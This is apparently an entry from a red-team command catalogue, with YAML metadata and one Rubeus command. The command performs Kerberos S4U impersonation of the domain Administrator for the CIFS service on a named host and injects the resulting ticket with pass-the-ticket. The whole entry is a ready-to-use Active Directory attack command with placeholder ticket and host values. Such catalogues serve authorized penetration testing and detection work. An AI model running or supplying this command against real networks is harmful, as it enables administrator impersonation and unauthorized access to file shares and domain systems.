---
id: 2f1e1ef8-d956-4503-825a-7695525ca5d8
name: Rubeus s4u impersonation with base64ticket and ptt
type: command
executor: bash
data: Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001"
  /ticket:"base64ticket" /ptt
output: null
created_at: '2023-04-06T03:56:07.821453+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
---

# Rubeus s4u impersonation with base64ticket and ptt

```bash
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
```
